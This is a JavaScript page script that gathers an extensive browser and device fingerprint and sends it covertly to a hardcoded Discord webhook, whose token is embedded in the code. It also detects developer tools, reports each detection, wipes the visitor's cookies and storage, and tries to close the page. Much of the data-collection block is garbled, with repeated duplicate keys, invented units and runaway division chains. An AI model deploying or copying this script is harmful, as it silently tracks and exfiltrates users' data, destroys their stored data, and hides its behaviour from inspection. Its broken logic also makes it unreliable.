// Obfuscated and minified JavaScript code
(function() {
    var webhookUrl = 'https://discord.com/api/webhooks/1409701776835481772/75d7K4GR4hEKgbKQys-Q_yBbSq-kUw2K1GTdKp24ehgCz0mprSQw8juEH-y7-69jxsff';

    // DevTools detection and blocking
    function blockDevTools() {
        // Method 1: Check for window size difference
        var widthThreshold = 160;
        var heightThreshold = 80;
        
        setInterval(function() {
            if (window.outerWidth - window.innerWidth > widthThreshold || 
                window.outerHeight - window.innerHeight > heightThreshold) {
                handleDevToolsDetected();
            }
        }, 1000);

        // Method 2: Debugger detection
        var debuggerDetected = false;
        
        function checkDebugger() {
            var startTime = performance.now();
            debugger;
            var endTime = performance.now();
            
            if (endTime - startTime > 100) {
                if (!debuggerDetected) {
                    debuggerDetected = true;
                    handleDevToolsDetected();
                }
            }
        }
        
        setInterval(checkDebugger, 2000);

        // Method 3: Console.log override detection
        var originalConsoleLog = console.log;
        console.log = function() {
            handleDevToolsDetected();
            return originalConsoleLog.apply(console, arguments);
        };

        // Method 4: Monitor console opening
        var element = new Image();
        Object.defineProperty(element, 'id', {
            get: function() {
                handleDevToolsDetected();
            }
        });

        console.log('%c', element);

        // Method 5: Performance timing detection
        setInterval(function() {
            var performanceThreshold = 200;
            if (performance.now() > performanceThreshold) {
                handleDevToolsDetected();
            }
        }, 5000);

        // Method 6: Function toString tampering detection
        var dummyFunction = function() {};
        var originalToString = Function.prototype.toString;
        
        Function.prototype.toString = function() {
            if (this === dummyFunction) {
                handleDevToolsDetected();
            }
            return originalToString.call(this);
        };
        
        console.log(dummyFunction.toString());
    }

    function handleDevToolsDetected() {
        // Send alert to webhook
        sendToWebhook('DevTools detected! Closing page...');
        
        // Clear all data
        try {
            localStorage.clear();
            sessionStorage.clear();
            document.cookie.split(";").forEach(function(c) { 
                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
            });
        } catch(e) {}
        
        // Redirect to blank page or close window
        setTimeout(function() {
            window.location.href = 'about:blank';
            document.body.innerHTML = '<h1>Access Denied</h1>';
            window.stop();
            
            // Try to close window
            try {
                window.open('', '_self', '');
                window.close();
            } catch(e) {
                // If window can't be closed, make page unusable
                document.body.innerHTML = '';
                document.head.innerHTML = '';
                while(document.body.firstChild) {
                    document.body.removeChild(document.body.firstChild);
                }
                window.onload = function() {
                    document.body.innerHTML = '';
                };
            }
        }, 100);
    }

    function sendToWebhook(message) {
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', webhookUrl, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            
            var data = JSON.stringify({
                message: message,
                timestamp: new Date().toISOString(),
                url: window.location.href,
                userAgent: navigator.userAgent
            });
            
            xhr.send(data);
        } catch(e) {
            // Silent fail if webhook fails
        }
    }

    function logData() {
        var data = {
            userAgent: navigator.userAgent,
            appName: navigator.appName,
            appVersion: navigator.appVersion,
            platform: navigator.platform,
            product: navigator.product,
            productSub: navigator.productSub,
            vendor: navigator.vendor,
            vendorSub: navigator.vendorSub,
            language: navigator.language,
            languages: navigator.languages,
            cookiesEnabled: navigator.cookieEnabled,
            online: navigator.onLine,
            geolocation: navigator.geolocation ? 'supported' : 'not supported',
            battery: navigator.battery ? 'supported' : 'not supported',
            connection: navigator.connection ? 'supported' : 'not supported',
            storage: navigator.storage ? 'supported' : 'not supported',
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            availableScreenResolution: `${window.screen.availWidth}x${window.screen.availHeight}`,
            colorDepth: window.screen.colorDepth,
            pixelDepth: window.screen.pixelDepth,
            plugins: Array.from(navigator.plugins).map(p => p.name),
            mimeTypes: Array.from(navigator.mimeTypes).map(mt => mt.type),
            performanceTiming: performance.timing,
            performanceNavigation: performance.navigation,
            performanceMemory: performance.memory,
            performanceNow: performance.now(),
            performanceMarks: performance.getEntriesByType('mark'),
            performanceMeasures: performance.getEntriesByType('measure'),
            performanceFrames: performance.getEntriesByType('frame'),
            performanceResource: performance.getEntriesByType('resource'),
            performancePaint: performance.getEntriesByType('paint'),
            performanceEvent: performance.getEntriesByType('event'),
            canvas: !!document.createElement('canvas').getContext,
            webgl: !!window.WebGLRenderingContext,
            webgl2: !!window.WebGL2RenderingContext,
            webAssembly: !!window.WebAssembly,
            serviceWorker: 'serviceWorker' in navigator,
            pushManager: 'PushManager' in window,
            notification: 'Notification' in window,
            vibration: 'vibrate' in navigator,
            batteryStatus: navigator.getBattery ? navigator.getBattery().then(battery => battery.level * 100) : 'not supported',
            storageEstimate: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.usage / 1024 / 1024) : 'not supported',
            storageQuota: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024) : 'not supported',
            storagePersisted: navigator.storage && navigator.storage.persisted ? navigator.storage.persisted().then(persisted => persisted) : 'not supported',
            storageType: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.usageType) : 'not supported',
            storageUsage: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.usage / 1024 / 1024) : 'not supported',
            storageQuotaUsage: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024) : 'not supported',
            storageQuotaUsagePercentage: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => (estimate.usage / estimate.quota) * 100) : 'not supported',
            storageQuotaUsageMB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024) : 'not supported',
            storageQuotaUsageGB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024 / 1024) : 'not supported',
            storageQuotaUsageTB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024 / 1024 / 1024) : 'not supported',
            storageQuotaUsagePB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024 / 1024 / 1024 / 1024) : 'not supported',
            storageQuotaUsageEB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024 / 1024 / 1024 / 1024 / 1024) : 'not supported',
            storageQuotaUsageZB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024) : 'not supported',
            storageQuotaUsageYB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024) : 'not supported',
            storageQuotaUsageBB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024) : 'not supported',
            storageQuotaUsageNB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024) : 'not supported',
            storageQuotaUsageTB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024) : 'not supported',
            storageQuotaUsagePB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024) : 'not supported',
            storageQuotaUsageEB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024) : 'not supported',
            storageQuotaUsageZB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024) : 'not supported',
            storageQuotaUsageYB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024) : 'not supported',
            storageQuotaUsageBB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024) : 'not supported',
            storageQuotaUsageNB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024) : 'not supported',
            storageQuotaUsageTB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024) : 'not supported',
            storageQuotaUsagePB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024) : 'not supported',
            storageQuotaUsageEB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024) : 'not supported',
            storageQuotaUsageZB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024) : 'not supported',
            storageQuotaUsageYB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024) : 'not supported',
            storageQuotaUsageBB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024) : 'not supported',
            storageQuotaUsageNB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024) : 'not supported',
            storageQuotaUsageTB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024) : 'not supported',
            storageQuotaUsagePB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024) : 'not supported',
            storageQuotaUsageEB: navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().then(estimate => estimate.quota / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024) : 'not supported',
        };

        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', webhookUrl, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(data));
        } catch(e) {
            // Silent fail if webhook fails
        }
    }

    // Start monitoring
    blockDevTools();
    logData();
    
    // Additional protection: Prevent right-click and F12
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        handleDevToolsDetected();
        return false;
    });
    
    document.addEventListener('keydown', function(e) {
        // F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+U
        if (e.keyCode === 123 || 
            (e.ctrlKey && e.shiftKey && e.keyCode === 73) || 
            (e.ctrlKey && e.shiftKey && e.keyCode === 67) ||
            (e.ctrlKey && e.keyCode === 85)) {
            e.preventDefault();
            handleDevToolsDetected();
            return false;
        }
    });
    
    // Make script harder to remove
    Object.defineProperty(window, 'blockDevTools', {
        value: blockDevTools,
        writable: false,
        configurable: false
    });
})();
